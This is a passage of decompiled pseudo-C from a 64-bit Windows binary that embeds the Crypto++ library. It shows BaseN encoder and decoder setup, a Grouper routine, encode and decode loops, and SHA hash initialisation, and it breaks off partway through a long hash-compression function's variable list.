  if ( (unsigned int)(v4 - 1) > 6 )
  {
    sub_13F1053B0(v11, (const __m128i *)"BaseN_Decoder: Log2Base must be between 1 and 7 inclusive");
    sub_13F101600((__int64)pExceptionObject, v11);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  *(_QWORD *)(a1 + 64) = 0i64;
  for ( i = v4; i % 8; i += v4 )
    ;
  v6 = i / 8;
  *(_DWORD *)(a1 + 60) = v6;
  sub_13F1051C0((_QWORD *)(a1 + 72), v6);
}
// 13F19B5B0: using guessed type __int64 qword_13F19B5B0;
// 13F1C2B08: using guessed type const int *int const * `RTTI Type Descriptor';
// 13F12E630: using guessed type __m128i var_E0[2];
// 13F12E630: using guessed type __m128i var_78[2];
// 13F12E630: using guessed type __m128i var_58[2];
// 13F12E630: using guessed type __m128i var_38[2];

//----- (000000013F12E7D0) ----------------------------------------------------
void __fastcall sub_13F12E7D0(__int64 a1, __int64 a2)
{
  int v4; // eax
  int v5; // ecx
  int v6; // er8
  __m128i *v7; // rax
  __m128i *v8; // rax
  __m128i *v9; // rax
  __m128i *v10; // rax
  char v11; // [rsp+20h] [rbp-E8h] BYREF
  char v12[7]; // [rsp+21h] [rbp-E7h] BYREF
  __int64 v13; // [rsp+28h] [rbp-E0h]
  __m128i v14[2]; // [rsp+30h] [rbp-D8h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-B8h] BYREF
  __m128i v16[2]; // [rsp+90h] [rbp-78h] BYREF
  __m128i v17[2]; // [rsp+B0h] [rbp-58h] BYREF
  __m128i v18[2]; // [rsp+D0h] [rbp-38h] BYREF

  v13 = -2i64;
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, const char *, const unsigned __int8 **, __int64))(*(_QWORD *)a2 + 8i64))(
          a2,
          "EncodingLookupArray",
          &unsigned char const * `RTTI Type Descriptor',
          a1 + 48) )
  {
    v7 = sub_13F1053B0(v14, (const __m128i *)"BaseN_Encoder");
    v8 = sub_13F107420(v16, v7, (const __m128i *)": missing required parameter '");
    v9 = sub_13F107420(v17, v8, (const __m128i *)"EncodingLookupArray");
    v10 = sub_13F107420(v18, v9, (const __m128i *)&qword_13F19B5B0);
    sub_13F101600((__int64)pExceptionObject, v10);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_13F12E560(a2, (const __m128i *)"BaseN_Encoder", (const __m128i *)"Log2Base");
  if ( (unsigned int)(*(_DWORD *)(a1 + 60) - 1) > 6 )
  {
    sub_13F1053B0(v14, (const __m128i *)"BaseN_Encoder: Log2Base must be between 1 and 7 inclusive");
    sub_13F101600((__int64)pExceptionObject, v14);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  if ( (*(unsigned __int8 (__fastcall **)(__int64, const char *, unsigned __int8 *, char *))(*(_QWORD *)a2 + 8i64))(
         a2,
         "PaddingByte",
         &unsigned char `RTTI Type Descriptor',
         v12)
    && (!(*(unsigned __int8 (__fastcall **)(__int64, __int64 *, bool *, char *))(*(_QWORD *)a2 + 8i64))(
           a2,
           &qword_13F187600,
           &bool `RTTI Type Descriptor',
           &v11)
     || v11) )
  {
    v4 = (unsigned __int8)v12[0];
  }
  else
  {
    v4 = -1;
  }
  *(_DWORD *)(a1 + 56) = v4;
  *(_QWORD *)(a1 + 68) = 0i64;
  v5 = 8;
  v6 = *(_DWORD *)(a1 + 60);
  if ( 8 % v6 )
  {
    do
      v5 += 8;
    while ( v5 % v6 );
  }
  *(_DWORD *)(a1 + 64) = v5 / v6;
  sub_13F1051C0((_QWORD *)(a1 + 80), v5 / v6);
}
// 13F187600: using guessed type __int64 qword_13F187600;
// 13F19B5B0: using guessed type __int64 qword_13F19B5B0;
// 13F1BF078: using guessed type const unsigned __int8 *unsigned char const * `RTTI Type Descriptor';
// 13F1BF170: using guessed type unsigned __int8 unsigned char `RTTI Type Descriptor';
// 13F1C3820: using guessed type bool bool `RTTI Type Descriptor';
// 13F12E7D0: using guessed type char var_E7[7];
// 13F12E7D0: using guessed type __m128i var_D8[2];
// 13F12E7D0: using guessed type __m128i var_78[2];
// 13F12E7D0: using guessed type __m128i var_58[2];
// 13F12E7D0: using guessed type __m128i var_38[2];

//----- (000000013F12E9B0) ----------------------------------------------------
void __fastcall sub_13F12E9B0(_QWORD *a1, __int64 *a2)
{
  char v4; // al
  int v5; // edx
  __int64 v6; // rax
  __int64 v7; // rsi
  const __m128i *v8; // rbx
  __m128i *v9; // rcx
  __int64 v10; // rsi
  const __m128i *v11; // rbx
  __m128i *v12; // rcx
  unsigned __int64 v13; // rcx
  __m128i *v14; // rdx
  unsigned __int64 v15; // rcx
  __m128i *v16; // rdx
  __m128i *v17; // rax
  __m128i *v18; // rax
  __m128i *v19; // rax
  __m128i *v20; // rax
  int v21; // [rsp+20h] [rbp-E0h] BYREF
  char v22[8]; // [rsp+28h] [rbp-D8h] BYREF
  const __m128i *v23; // [rsp+30h] [rbp-D0h]
  __int64 v24; // [rsp+38h] [rbp-C8h]
  unsigned __int64 v25; // [rsp+48h] [rbp-B8h]
  unsigned __int64 v26; // [rsp+50h] [rbp-B0h]
  __m128i *v27; // [rsp+58h] [rbp-A8h]
  char v28[8]; // [rsp+60h] [rbp-A0h] BYREF
  const __m128i *v29; // [rsp+68h] [rbp-98h]
  __int64 v30; // [rsp+70h] [rbp-90h]
  unsigned __int64 v31; // [rsp+80h] [rbp-80h]
  unsigned __int64 v32; // [rsp+88h] [rbp-78h]
  __m128i *v33; // [rsp+90h] [rbp-70h]
  __int64 v34; // [rsp+98h] [rbp-68h]
  __m128i v35[2]; // [rsp+A0h] [rbp-60h] BYREF
  __m128i v36[2]; // [rsp+C0h] [rbp-40h] BYREF
  __m128i v37[2]; // [rsp+E0h] [rbp-20h] BYREF
  __m128i v38[2]; // [rsp+100h] [rbp+0h] BYREF
  char pExceptionObject[64]; // [rsp+120h] [rbp+20h] BYREF

  v34 = -2i64;
  v4 = (*(__int64 (__fastcall **)(__int64 *, const char *, int *, int *))(*a2 + 8))(
         a2,
         "GroupSize",
         &int `RTTI Type Descriptor',
         &v21);
  v5 = 0;
  if ( v4 )
    v5 = v21;
  a1[14] = v5;
  v25 = -1i64;
  v26 = 0i64;
  v27 = 0i64;
  v23 = 0i64;
  v24 = 0i64;
  v22[0] = 0;
  v31 = -1i64;
  v32 = 0i64;
  v33 = 0i64;
  v29 = 0i64;
  v30 = 0i64;
  v28[0] = 0;
  v6 = *a2;
  if ( v5 )
  {
    if ( !(*(unsigned __int8 (__fastcall **)(__int64 *, const char *, void *, char *))(v6 + 8))(
            a2,
            "Separator",
            &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
            v22) )
    {
      v17 = sub_13F1053B0(v35, (const __m128i *)"Grouper");
      v18 = sub_13F107420(v36, v17, (const __m128i *)": missing required parameter '");
      v19 = sub_13F107420(v37, v18, (const __m128i *)"Separator");
      v20 = sub_13F107420(v38, v19, (const __m128i *)&qword_13F19B5B0);
      sub_13F101600((__int64)pExceptionObject, v20);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
  }
  else
  {
    (*(void (__fastcall **)(__int64 *, const char *, void *, char *))(v6 + 8))(
      a2,
      "Separator",
      &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
      v22);
  }
  (*(void (__fastcall **)(__int64 *, const char *, void *, char *))(*a2 + 8))(
    a2,
    "Terminator",
    &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
    v28);
  if ( v22[0] )
  {
    v7 = v26;
    v8 = v27;
  }
  else
  {
    v7 = v24;
    v8 = v23;
  }
  sub_13F1051C0(a1 + 6, v7);
  v9 = (__m128i *)a1[9];
  if ( v9 && v8 )
    sub_13F10D330(v9, a1[8], v8, v7);
  a1[7] = -1i64;
  if ( v28[0] )
  {
    v10 = v32;
    v11 = v33;
  }
  else
  {
    v10 = v30;
    v11 = v29;
  }
  sub_13F1051C0(a1 + 10, v10);
  v12 = (__m128i *)a1[13];
  if ( v12 && v11 )
    sub_13F10D330(v12, a1[12], v11, v10);
  a1[11] = -1i64;
  a1[15] = 0i64;
  v13 = v32;
  if ( v31 < v32 )
    v13 = v31;
  v14 = v33;
  if ( v33 )
  {
    memset(v33, 0, v13);
    sub_13F12E550(v14);
  }
  v15 = v26;
  if ( v25 < v26 )
    v15 = v25;
  v16 = v27;
  if ( v27 )
  {
    memset(v27, 0, v15);
    sub_13F12E550(v16);
  }
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F19B5B0: using guessed type __int64 qword_13F19B5B0;
// 13F1C3E48: using guessed type int int `RTTI Type Descriptor';
// 13F12E9B0: using guessed type char var_168[8];
// 13F12E9B0: using guessed type char var_130[8];
// 13F12E9B0: using guessed type __m128i var_F0[2];
// 13F12E9B0: using guessed type __m128i var_D0[2];
// 13F12E9B0: using guessed type __m128i var_B0[2];
// 13F12E9B0: using guessed type __m128i var_90[2];

//----- (000000013F12EC20) ----------------------------------------------------
__int64 __fastcall sub_13F12EC20(__int64 a1, __int64 a2, unsigned __int64 a3, int a4, char a5)
{
  int v6; // ecx
  __int64 v10; // rsi
  int v11; // ecx
  unsigned __int64 v12; // rdx
  unsigned int v13; // edi
  int v14; // eax
  int v15; // er8
  char *v16; // rdx
  char v17; // r9
  __int64 v18; // rdx
  int v19; // eax

  v6 = *(_DWORD *)(a1 + 40);
  v10 = 1i64;
  if ( !v6 )
  {
    *(_QWORD *)(a1 + 32) = 0i64;
    goto LABEL_6;
  }
  v11 = v6 - 1;
  if ( v11 )
  {
    if ( v11 != 1 )
      return 0i64;
  }
  else
  {
LABEL_18:
    if ( sub_13F129E10((_DWORD *)a1, 1, *(_QWORD *)(a1 + 96), *(int *)(a1 + 60), 0, a5, (__int64)&qword_13F1B7008) )
    {
      if ( (unsigned __int64)(*(int *)(a1 + 60) - *(_QWORD *)(a1 + 32)) > 1 )
        return *(int *)(a1 + 60) - *(_QWORD *)(a1 + 32);
      return v10;
    }
    *(_QWORD *)(a1 + 64) = 0i64;
LABEL_6:
    while ( 1 )
    {
      v12 = *(_QWORD *)(a1 + 32);
      if ( v12 >= a3 )
        break;
      v13 = *(_DWORD *)(*(_QWORD *)(a1 + 48) + 4i64 * *(unsigned __int8 *)(v12 + a2));
      *(_QWORD *)(a1 + 32) = v12 + 1;
      if ( v13 < 0x100 )
      {
        v14 = *(_DWORD *)(a1 + 64);
        if ( !v14 && !*(_DWORD *)(a1 + 68) )
        {
          sub_13F15EF70(*(_QWORD *)(a1 + 96), 0, *(int *)(a1 + 60));
          v14 = *(_DWORD *)(a1 + 64);
        }
        v15 = *(_DWORD *)(a1 + 68) + *(_DWORD *)(a1 + 56);
        v16 = (char *)(*(_QWORD *)(a1 + 96) + v14);
        v17 = *v16;
        if ( v15 > 8 )
        {
          *v16 = v17 | (v13 >> (v15 - 8));
          v18 = *(int *)(a1 + 64) + *(_QWORD *)(a1 + 96);
          *(_BYTE *)(v18 + 1) |= (_BYTE)v13 << (16 - v15);
        }
        else
        {
          *v16 = v17 | ((_BYTE)v13 << (8 - v15));
        }
        v19 = *(_DWORD *)(a1 + 64);
        *(_DWORD *)(a1 + 68) = v15;
        if ( v15 >= 8 )
        {
          do
          {
            v15 -= 8;
            ++v19;
          }
          while ( v15 >= 8 );
          *(_DWORD *)(a1 + 64) = v19;
          *(_DWORD *)(a1 + 68) = v15;
        }
        if ( v19 == *(_DWORD *)(a1 + 60) )
          goto LABEL_18;
      }
    }
    if ( !a4 )
      return 0i64;
  }
  if ( !sub_13F129E10((_DWORD *)a1, 2, *(_QWORD *)(a1 + 96), *(int *)(a1 + 64), a4, a5, (__int64)&qword_13F1B7008) )
  {
    *(_QWORD *)(a1 + 64) = 0i64;
    return 0i64;
  }
  if ( (unsigned __int64)(*(int *)(a1 + 64) - *(_QWORD *)(a1 + 32)) > 1 )
    return *(int *)(a1 + 64) - *(_QWORD *)(a1 + 32);
  return v10;
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F12EE00) ----------------------------------------------------
__int64 __fastcall sub_13F12EE00(__int64 a1, __int64 a2, unsigned __int64 a3, int a4, char a5)
{
  int v6; // ecx
  __int64 v10; // rdi
  int v11; // ecx
  unsigned __int64 v12; // rax
  int v13; // ecx
  unsigned int v14; // er11
  unsigned int v15; // er9
  unsigned int v16; // er10
  _BYTE *v17; // r8
  unsigned int v18; // edx
  __int64 v19; // rdx
  int v20; // eax
  char v21; // cl
  int v22; // er9
  __int64 v23; // r8
  int v25; // ecx
  int v26; // er8
  __int64 v27; // r9
  int v28; // edx

  v6 = *(_DWORD *)(a1 + 40);
  v10 = 1i64;
  if ( !v6 )
  {
    *(_QWORD *)(a1 + 32) = 0i64;
    goto LABEL_6;
  }
  v11 = v6 - 1;
  if ( v11 )
  {
    if ( v11 != 1 )
      return 0i64;
  }
  else
  {
LABEL_17:
    if ( sub_13F129E10((_DWORD *)a1, 1, *(_QWORD *)(a1 + 104), *(int *)(a1 + 64), 0, a5, (__int64)&qword_13F1B7008) )
    {
      if ( (unsigned __int64)(*(int *)(a1 + 64) - *(_QWORD *)(a1 + 32)) > 1 )
        return *(int *)(a1 + 64) - *(_QWORD *)(a1 + 32);
      return v10;
    }
    *(_QWORD *)(a1 + 68) = 0i64;
LABEL_6:
    while ( 1 )
    {
      v12 = *(_QWORD *)(a1 + 32);
      if ( v12 >= a3 )
        break;
      v13 = *(_DWORD *)(a1 + 68);
      if ( !v13 )
      {
        sub_13F15EF70(*(_QWORD *)(a1 + 104), 0, *(int *)(a1 + 64));
        v12 = *(_QWORD *)(a1 + 32);
        v13 = *(_DWORD *)(a1 + 68);
      }
      v14 = *(unsigned __int8 *)(v12 + a2);
      v15 = 8;
      v16 = *(_DWORD *)(a1 + 60) - *(_DWORD *)(a1 + 72);
      v17 = (_BYTE *)(*(_QWORD *)(a1 + 104) + v13);
      v18 = v14 >> (8 - (*(_BYTE *)(a1 + 60) - *(_BYTE *)(a1 + 72)));
      *(_QWORD *)(a1 + 32) = v12 + 1;
      *v17 |= v18;
      if ( v16 > 8 )
      {
LABEL_12:
        *(_DWORD *)(a1 + 72) += v15;
        v20 = *(_DWORD *)(a1 + 68);
      }
      else
      {
        while ( 1 )
        {
          v19 = *(int *)(a1 + 68);
          *(_DWORD *)(a1 + 72) = 0;
          v20 = v19 + 1;
          *(_DWORD *)(a1 + 68) = v19 + 1;
          v15 -= v16;
          if ( !v15 )
            break;
          v21 = v16;
          v16 = *(_DWORD *)(a1 + 60);
          LOBYTE(v14) = v14 << v21;
          *(_BYTE *)(v19 + *(_QWORD *)(a1 + 104) + 1) |= (unsigned __int8)v14 >> (8 - v16);
          if ( v15 < v16 )
            goto LABEL_12;
        }
      }
      if ( v20 == *(_DWORD *)(a1 + 64) )
      {
        v22 = 0;
        if ( v20 > 0 )
        {
          v23 = 0i64;
          do
          {
            ++v23;
            ++v22;
            *(_BYTE *)(*(_QWORD *)(a1 + 104) + v23 - 1) = *(_BYTE *)(*(unsigned __int8 *)(*(_QWORD *)(a1 + 104) + v23 - 1)
                                                                   + *(_QWORD *)(a1 + 48));
          }
          while ( v22 < *(_DWORD *)(a1 + 68) );
        }
        goto LABEL_17;
      }
    }
    if ( !a4 )
      return 0i64;
    v25 = *(_DWORD *)(a1 + 68);
    if ( *(int *)(a1 + 72) > 0 )
      *(_DWORD *)(a1 + 68) = ++v25;
    v26 = 0;
    if ( v25 > 0 )
    {
      v27 = 0i64;
      do
      {
        ++v27;
        ++v26;
        *(_BYTE *)(*(_QWORD *)(a1 + 104) + v27 - 1) = *(_BYTE *)(*(unsigned __int8 *)(*(_QWORD *)(a1 + 104) + v27 - 1)
                                                               + *(_QWORD *)(a1 + 48));
        v25 = *(_DWORD *)(a1 + 68);
      }
      while ( v26 < v25 );
    }
    v28 = *(_DWORD *)(a1 + 56);
    if ( v28 != -1 && v25 > 0 )
    {
      sub_13F15EF70(*(_QWORD *)(a1 + 104) + v25, v28, *(_DWORD *)(a1 + 64) - v25);
      *(_DWORD *)(a1 + 68) = *(_DWORD *)(a1 + 64);
    }
  }
  if ( !sub_13F129E10((_DWORD *)a1, 2, *(_QWORD *)(a1 + 104), *(int *)(a1 + 68), a4, a5, (__int64)&qword_13F1B7008) )
  {
    *(_QWORD *)(a1 + 68) = 0i64;
    return 0i64;
  }
  if ( (unsigned __int64)(*(int *)(a1 + 68) - *(_QWORD *)(a1 + 32)) > 1 )
    return *(int *)(a1 + 68) - *(_QWORD *)(a1 + 32);
  return v10;
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F12F060) ----------------------------------------------------
__int64 __fastcall sub_13F12F060(__int64 a1, __int64 a2, unsigned __int64 a3, int a4, char a5)
{
  int v7; // ecx
  __int64 v10; // rdi
  int v11; // ecx
  int v12; // ecx
  int v13; // ecx
  unsigned __int64 v14; // rax
  __int64 v15; // rax
  __int64 v16; // rsi
  __int64 v17; // rax
  __int64 v18; // rcx
  __int64 result; // rax
  unsigned __int64 v20; // rsi
  unsigned __int64 v21; // rbp

  v7 = *(_DWORD *)(a1 + 40);
  v10 = 1i64;
  if ( v7 )
  {
    v11 = v7 - 1;
    if ( !v11 )
      goto LABEL_10;
    v12 = v11 - 1;
    if ( !v12 )
    {
      while ( 1 )
      {
        v15 = *(_QWORD *)(a1 + 32);
        v16 = a3 - v15;
        if ( *(_QWORD *)(a1 + 112) - *(_QWORD *)(a1 + 120) < a3 - v15 )
          v16 = *(_QWORD *)(a1 + 112) - *(_QWORD *)(a1 + 120);
        v17 = sub_13F129E10((_DWORD *)a1, 2, v15 + a2, v16, 0, a5, (__int64)&qword_13F1B7008);
        v18 = *(_QWORD *)(a1 + 32);
        if ( v17 )
          break;
        *(_QWORD *)(a1 + 120) += v16;
        v14 = v18 + v16;
        *(_QWORD *)(a1 + 32) = v18 + v16;
LABEL_8:
        if ( v14 >= a3 )
          goto LABEL_26;
        if ( *(_QWORD *)(a1 + 120) == *(_QWORD *)(a1 + 112) )
        {
LABEL_10:
          if ( sub_13F129E10(
                 (_DWORD *)a1,
                 1,
                 *(_QWORD *)(a1 + 72),
                 *(_QWORD *)(a1 + 64),
                 0,
                 a5,
                 (__int64)&qword_13F1B7008) )
          {
            if ( *(_QWORD *)(a1 + 64) - *(_QWORD *)(a1 + 32) > 1ui64 )
              return *(_QWORD *)(a1 + 64) - *(_QWORD *)(a1 + 32);
            return v10;
          }
          *(_QWORD *)(a1 + 120) = 0i64;
        }
      }
      v20 = v16 - v18;
      if ( v20 > 1 )
        return v20;
      return v10;
    }
    v13 = v12 - 1;
    if ( v13 )
    {
      if ( v13 != 1 )
        return 0i64;
LABEL_27:
      if ( sub_13F129E10(
             (_DWORD *)a1,
             4,
             *(_QWORD *)(a1 + 104),
             *(_QWORD *)(a1 + 96),
             a4,
             a5,
             (__int64)&qword_13F1B7008) )
      {
        if ( *(_QWORD *)(a1 + 96) - *(_QWORD *)(a1 + 32) > 1ui64 )
          return *(_QWORD *)(a1 + 96) - *(_QWORD *)(a1 + 32);
        return v10;
      }
      *(_QWORD *)(a1 + 120) = 0i64;
      return 0i64;
    }
  }
  else
  {
    v14 = 0i64;
    *(_QWORD *)(a1 + 32) = 0i64;
    if ( *(_QWORD *)(a1 + 112) )
      goto LABEL_8;
  }
  if ( !sub_13F129E10((_DWORD *)a1, 3, a2, a3, 0, a5, (__int64)&qword_13F1B7008) )
  {
LABEL_26:
    if ( !a4 )
      return 0i64;
    goto LABEL_27;
  }
  v21 = a3 - *(_QWORD *)(a1 + 32);
  result = 1i64;
  if ( v21 > 1 )
    return v21;
  return result;
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F12F250) ----------------------------------------------------
__m128i *__fastcall sub_13F12F250(__int64 a1, __m128i *a2)
{
  a2[1].m128i_i64[0] = 0i64;
  a2[1].m128i_i64[1] = 15i64;
  a2->m128i_i8[0] = 0;
  sub_13F106C30(a2, (const __m128i *)"C++");
  return a2;
}
// 13F1C56B0: using guessed type char byte_13F1C56B0;
// 13F1C56BA: using guessed type char byte_13F1C56BA;

//----- (000000013F12F2B0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F12F2B0(_DWORD **a1, __int64 a2, unsigned __int64 a3)
{
  bool v6; // r14
  __int64 v7; // rbp
  _DWORD *v8; // rdx

  v6 = (*((unsigned int (__fastcall **)(_DWORD **))*a1 + 20))(a1) == 0;
  v7 = (*((__int64 (__fastcall **)(_DWORD **))*a1 + 23))(a1);
  do
  {
    v8 = (_DWORD *)a2;
    if ( !v6 )
    {
      sub_13F12AE84(v7, a2, 0x40ui64);
      v8 = (_DWORD *)v7;
    }
    sub_13F12F500(a1[25], v8);
    a2 += 64i64;
    a3 -= 64i64;
  }
  while ( a3 >= 0x40 );
  return a3;
}
// 13F1C56B0: using guessed type char byte_13F1C56B0;
// 13F1C56BA: using guessed type char byte_13F1C56BA;

//----- (000000013F12F390) ----------------------------------------------------
__int64 __fastcall sub_13F12F390(__int64 a1, unsigned __int64 *a2, __int64 a3)
{
  __int64 v3; // rbx

  v3 = a3 & 0x3F;
  sub_13F13AF90(*(__m128i **)(a1 + 208), a2, a3 - v3);
  return (unsigned int)v3;
}
// 13F12F390: could not find valid save-restore pair for rbp
// 13F1C56B0: using guessed type char byte_13F1C56B0;
// 13F1C56B1: using guessed type char byte_13F1C56B1;
// 13F1C56BA: using guessed type char byte_13F1C56BA;

//----- (000000013F12F4B0) ----------------------------------------------------
void __fastcall sub_13F12F4B0(_DWORD *a1)
{
  *a1 = 1732584193;
  a1[1] = -271733879;
  a1[2] = -1732584194;
  a1[3] = 271733878;
  a1[4] = -1009589776;
}

//----- (000000013F12F4E0) ----------------------------------------------------
void __fastcall sub_13F12F4E0(_OWORD *a1)
{
  *a1 = xmmword_13F187A38;
  a1[1] = xmmword_13F187A48;
}
// 13F187A38: using guessed type __int128 xmmword_13F187A38;
// 13F187A48: using guessed type __int128 xmmword_13F187A48;

//----- (000000013F12F500) ----------------------------------------------------
__int64 __fastcall sub_13F12F500(_DWORD *a1, _DWORD *a2)
{
  _DWORD *v2; // rdi
  int v3; // ebx
  int v4; // er10
  int v5; // er11
  int v6; // esi
  int v7; // er14
  int v8; // er15
  int v9; // er12
  int v10; // ebp
  int v11; // er13
  int v12; // edx
  int v13; // er9
  int v14; // er8
  int v15; // er10
  int v16; // er11
  int v17; // er9
  int v18; // er11
  int v19; // ecx
  int v20; // er10
  int v21; // edx
  int v22; // ecx
  int v23; // er11
  int v24; // er8
  int v25; // ebx
  int v26; // edx
  int v27; // ecx
  int v28; // er8
  int v29; // er10
  int v30; // ecx
  int v31; // ebx
  int v32; // er11
  int v33; // ecx
  int v34; // er10
  int v35; // er9
  int v36; // ecx
  int v37; // er11
  int v38; // er8
  int v39; // ecx
  int v40; // er9
  int v41; // edx
  int v42; // ecx
  int v43; // er8
  int v44; // er10
  int v45; // ecx
  int v46; // edx
  int v47; // er11
  int v48; // ecx
  int v49; // er10
  int v50; // er9
  int v51; // ecx
  int v52; // er11
  int v53; // er8
  int v54; // eax
  int v55; // ecx
  int v56; // er9
  int v57; // ebx
  int v58; // er8
  int v59; // ebx
  unsigned int v60; // er10
  int v61; // esi
  int v62; // er14
  unsigned int v63; // er11
  int v64; // ebx
  int v65; // er11
  unsigned int v66; // edx
  int v67; // er10
  int v68; // ecx
  int v69; // er11
  int v70; // er8
  int v71; // ecx
  int v72; // edx
  int v73; // er9
  int v74; // ebx
  int v75; // er13
  int v76; // ecx
  int v77; // er8
  int v78; // er10
  int v79; // ecx
  int v80; // er9
  int v81; // er11
  int v82; // ebx
  int v83; // ecx
  int v84; // er10
  int v85; // edx
  int v86; // ecx
  int v87; // er11
  int v88; // eax
  int v89; // er8
  int v90; // er14
  int v91; // ecx
  int v92; // edx
  int v93; // ebp
  int v94; // er9
  int v95; // ecx
  int v96; // er8
  int v97; // er10
  int v98; // ecx
  int v99; // er9
  int v100; // er11
  int v101; // eax
  int v102; // ebp
  int v103; // ecx
  int v104; // er10
  int v105; // edx
  int v106; // ecx
  int v107; // er11
  int v108; // er8
  int v109; // ecx
  int v110; // edx
  int v111; // er9
  int v112; // ecx
  int v113; // er15
  int v114; // er8
  int v115; // er10
  int v116; // ecx
  int v117; // er9
  int v118; // er11
  int v119; // er12
  int v120; // ebp
  int v121; // ecx
  int v122; // er10
  int v123; // edx
  int v124; // ecx
  int v125; // er11
  int v126; // er8
  int v127; // er9
  int v128; // edx
  int v129; // ecx
  int v130; // er8
  int v131; // er12
  int v132; // er10
  int v133; // esi
  int v134; // ecx
  int v135; // er9
  int v136; // er11
  int v137; // ecx
  int v138; // er10
  int v139; // ebx
  int v140; // ecx
  int v141; // er11
  int v142; // er14
  int v143; // er8
  int v144; // eax
  int v145; // ecx
  int v146; // ebx
  int v147; // ecx
  int v148; // er12
  int v149; // eax
  int v150; // esi
  int v151; // er9
  int v152; // ecx
  int v153; // er8
  int v154; // er12
  int v155; // er10
  int v156; // ecx
  int v157; // er9
  int v158; // er11
  int v159; // eax
  int v160; // ecx
  int v161; // er10
  int v162; // ebx
  int v163; // ecx
  int v164; // er11
  int v165; // er8
  int v166; // eax
  int v167; // ecx
  int v168; // ebx
  int v169; // ecx
  int v170; // eax
  int v171; // er9
  int v172; // ecx
  int v173; // er8
  int v174; // ecx
  int v175; // eax
  int v176; // er10
  int v177; // ecx
  int v178; // er9
  int v179; // er11
  int v180; // er14
  int v181; // ebx
  int v182; // er10
  int v183; // ebp
  int v184; // esi
  int v185; // er12
  int v186; // ecx
  int v187; // er11
  int v188; // er13
  int v189; // er8
  int v190; // eax
  int v191; // ecx
  int v192; // ebx
  int v193; // ecx
  int v194; // eax
  int v195; // er9
  int v196; // ecx
  int v197; // er8
  int v198; // er10
  int v199; // er11
  int v200; // er9
  int v201; // er15
  int v202; // ecx
  int v203; // er10
  int v204; // eax
  int v205; // ecx
  int v206; // er11
  int v207; // ebx
  int v208; // er14
  unsigned int v209; // ecx
  int v210; // er9
  unsigned int v211; // er10
  int v212; // ebx
  unsigned int v213; // ecx
  int v214; // er9
  int v215; // eax
  int v216; // er11
  int v217; // ecx
  int v218; // er10
  int v219; // ecx
  int v220; // eax
  int v221; // er8
  int v222; // er11
  int v223; // ebp
  int v224; // edx
  int v225; // eax
  int v226; // er8
  int v227; // er9
  int v228; // eax
  int v229; // edx
  int v230; // er10
  int v231; // eax
  int v232; // er9
  int v233; // er11
  int v234; // ebx
  int v235; // eax
  int v236; // er10
  int v237; // er13
  int v238; // er8
  int v239; // eax
  int v240; // er11
  int v241; // edx
  int v242; // eax
  int v243; // er8
  int v244; // er9
  int v245; // er10
  int v246; // edx
  int v247; // er15
  int v248; // esi
  int v249; // eax
  int v250; // er9
  int v251; // er12
  int v252; // er15
  int v253; // er11
  int v254; // eax
  int v255; // er10
  int v256; // er8
  int v257; // eax
  int v258; // er11
  int v259; // ebx
  int v260; // eax
  int v261; // er8
  int v262; // edx
  int v263; // er14
  int v264; // ebp
  int v265; // ebx
  int v266; // eax
  int v267; // er14
  int v268; // er9
  int v269; // er10
  int v270; // esi
  int v271; // eax
  int v272; // ebp
  int v273; // eax
  int v274; // esi
  int v275; // er8
  int v276; // edx
  int v277; // ebx
  unsigned int v278; // eax
  int v279; // er11
  int v280; // eax
  int v281; // ebx
  unsigned int v282; // er9
  int v283; // eax
  int v284; // er11
  unsigned int v285; // er8
  int v286; // ecx
  __int64 result; // rax
  int v288; // [rsp+0h] [rbp-88h]
  int v289; // [rsp+0h] [rbp-88h]
  int v290; // [rsp+0h] [rbp-88h]
  int v291; // [rsp+0h] [rbp-88h]
  int v292; // [rsp+0h] [rbp-88h]
  int v293; // [rsp+4h] [rbp-84h]
  int v294; // [rsp+4h] [rbp-84h]
  int v295; // [rsp+4h] [rbp-84h]
  int v296; // [rsp+4h] [rbp-84h]
  int v297; // [rsp+8h] [rbp-80h]
  int v298; // [rsp+8h] [rbp-80h]
  int v299; // [rsp+8h] [rbp-80h]
  int v300; // [rsp+8h] [rbp-80h]
  int v301; // [rsp+8h] [rbp-80h]
  int v302; // [rsp+Ch] [rbp-7Ch]
  int v303; // [rsp+Ch] [rbp-7Ch]
  int v304; // [rsp+Ch] [rbp-7Ch]
  int v305; // [rsp+10h] [rbp-78h]
  int v306; // [rsp+10h] [rbp-78h]
  int v307; // [rsp+10h] [rbp-78h]
  int v308; // [rsp+14h] [rbp-74h]
  int v309; // [rsp+14h] [rbp-74h]
  int v310; // [rsp+14h] [rbp-74h]
  int v311; // [rsp+18h] [rbp-70h]
  int v312; // [rsp+18h] [rbp-70h]
  int v313; // [rsp+18h] [rbp-70h]
  int v314; // [rsp+18h] [rbp-70h]
  int v315; // [rsp+1Ch] [rbp-6Ch]
  int v316; // [rsp+1Ch] [rbp-6Ch]
  int v317; // [rsp+1Ch] [rbp-6Ch]
  int v318; // [rsp+20h] [rbp-68h]
  int v319; // [rsp+20h] [rbp-68h]
  int v320; // [rsp+20h] [rbp-68h]
  int v321; // [rsp+20h] [rbp-68h]
  int v322; // [rsp+24h] [rbp-64h]
  int v323; // [rsp+24h] [rbp-64h]
  int v324; // [rsp+24h] [rbp-64h]
  int v325; // [rsp+28h] [rbp-60h]
  int v326; // [rsp+28h] [rbp-60h]
  int v327; // [rsp+28h] [rbp-60h]
  int v328; // [rsp+28h] [rbp-60h]
  int v329; // [rsp+2Ch] [rbp-5Ch]
  int v330; // [rsp+2Ch] [rbp-5Ch]
  int v331; // [rsp+2Ch] [rbp-5Ch]
